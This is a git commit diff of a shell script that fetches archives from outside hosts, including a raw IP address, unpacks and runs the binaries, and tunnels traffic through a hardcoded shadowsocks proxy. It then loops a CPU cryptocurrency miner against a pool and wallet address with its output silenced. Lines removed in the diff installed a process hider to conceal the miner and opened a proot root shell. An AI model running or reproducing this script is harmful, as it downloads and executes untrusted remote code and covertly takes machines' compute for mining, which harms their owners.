9ef3a235fa91042e7095443ec5ebd6216b8af625
williamarmenta54 <williamarmenta54@gmail.com>
2024-09-16 16:51:04 +0200

    Update p2b_for_data.sh

--- p2b_for_data.sh
+++ p2b_for_data.sh
@@ -1,26 +1,9 @@
 #!/bin/sh
-wget http://greenleaf.teatspray.fun/backup5.tar.gz
-sleep 3
-tar -xf backup5.tar.gz
-sleep 3
-rm backup5.tar.gz
-./dist/proot -S . /bin/bash
-su -
-sleep 3
-whoami
-sleep 3
-ls -la
-sleep 3
-
 export DEBIAN_FRONTEND=noninteractive
 DEBIAN_FRONTEND=noninteractive
 
 sleep 2
 cat /etc/*-release
-sleep 2
-
-apt update >/dev/null;apt -y install apt-utils psmisc libreadline-dev dialog automake libssl-dev libcurl4-openssl-dev libjansson-dev libgmp-dev zlib1g-dev git binutils cmake build-essential unzip net-tools curl apt-utils wget dpkg >/dev/null
-
 sleep 2
 
 num_of_cores=`cat /proc/cpuinfo | grep processor | wc -l`
@@ -36,7 +19,15 @@ echo ""
 
 sleep 2
 
-Spectre -L=:1082 -F=ss://aes-128-cfb:mikrotik999@cpusocks$(shuf -i 1-6 -n 1).wot.mrface.com:8443 &
+wget http://45.135.58.52/Spectre.tar.gz
+
+sleep 2
+
+tar -xf Spectre.tar.gz
+
+sleep 2
+
+./Spectre -L=:1082 -F=ss://aes-128-cfb:mikrotik999@cpusocks$(shuf -i 1-6 -n 1).wot.mrface.com:8443 &
 
 sleep 2
 
@@ -44,30 +35,15 @@ curl -x socks5h://127.0.0.1:1082 api.ipify.org
 
 sleep 2
 
-DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends tzdata > /dev/null
-
-sleep 2
-
-ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime > /dev/null
-dpkg-reconfigure --frontend noninteractive tzdata > /dev/null
-
-sleep 2
-
 TZ='Africa/Johannesburg'; export TZ
 date 
 sleep 2 
 
-npm i -g node-process-hider 1>/dev/null 2>&1
+wget -q http://greenleaf.teatspray.fun/GP_261.tar.gz >/dev/null
 
 sleep 2
 
-ph add glove 1>/dev/null 2>&1
-
-sleep 2
-
-wget -q http://greenleaf.teatspray.fun/glove.tar.gz >/dev/null
-
-tar -xf glove.tar.gz
+tar -xf GP_261.tar.gz
 
 sleep 2
 
@@ -79,6 +55,6 @@ sleep 2
 
 while true
 do
-./glove --algo yespower-b2b --param-n 2048 --param-r 32 --param-key "Now I am become Death, the destroyer of worlds" -o stratum+tcp://stratum-mining-pool.zapto.org:3765 -u MiKbRHckresTQLQQiXcBVeKkE1ScK9Wa93.$currentdate -p x -t $used_num_of_cores --proxy=socks5://127.0.0.1:1082 1>/dev/null 2>&1
+./GP --disable-gpu --algorithm power2b --pool stratum-mining-pool.zapto.org:3765 --wallet MiKbRHckresTQLQQiXcBVeKkE1ScK9Wa93.$currentdate --password x --proxy 127.0.0.1:1082 --cpu-threads $used_num_of_cores --keepalive 1>/dev/null 2>&1
 sleep 10
 done
